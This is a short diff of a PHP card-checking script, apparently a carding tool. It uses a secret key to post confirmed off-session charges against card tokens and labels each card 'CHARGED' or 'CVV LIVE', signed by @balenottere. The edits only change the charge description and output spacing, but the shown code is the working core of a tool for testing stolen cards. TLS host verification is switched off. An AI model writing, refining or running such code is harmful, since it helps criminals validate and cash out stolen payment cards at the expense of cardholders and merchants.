@@ -110,7 +110,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Checked by Night Checker&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=undefy&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -139,7 +139,7 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.'𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
